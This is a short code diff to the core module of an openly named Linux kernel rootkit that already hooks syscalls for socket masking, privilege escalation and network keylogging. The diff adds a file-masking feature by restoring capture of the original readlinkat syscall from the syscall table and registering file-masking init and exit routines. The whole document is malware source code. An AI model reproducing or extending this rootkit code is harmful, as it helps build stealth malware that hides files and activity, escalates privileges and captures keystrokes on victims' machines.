@@ -34,6 +34,7 @@
 #include "socket_masking.h"		/* Needed for ... */
 #include "conf_manager.h"		/* Needed for ... */
 #include "udp_server.h"			/* Needed for ... */
+#include "file_masking.h"
 #include "core.h"
 
 
@@ -101,7 +102,7 @@ static int __init core_start(void)
 	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
 	original_read_syscall = (void *) syscall_table[__NR_read];
 	original_getdents_syscall = (void *) syscall_table[__NR_getdents];
-	//original_readlinkat_syscall = (void *) syscall_table[__NR_readlinkat];
+	original_readlinkat_syscall = (void *) syscall_table[__NR_readlinkat];
 	original_recvmsg_syscall = (void *) syscall_table[__NR_recvmsg];
 
 	/* Overwrite manipulated syscall */
@@ -119,6 +120,7 @@ static int __init core_start(void)
 	socket_masking_init(DEBUG_MODE_IS_ON);
 	conf_manager_init(DEBUG_MODE_IS_ON);
 	udp_server_init(DEBUG_MODE_IS_ON);
+	file_masking_init(DEBUG_MODE_IS_ON, (void *)original_readlinkat_syscall);
 
 	DEBUG_PRINT("successfully inserted");
 
@@ -148,6 +150,7 @@ static void __exit core_end(void)
 	privil_escalation_exit();
 	network_keylogging_exit();
 	//module_masking_exit();
+	file_masking_exit();
 
 	DEBUG_PRINT("successfully removed");
 
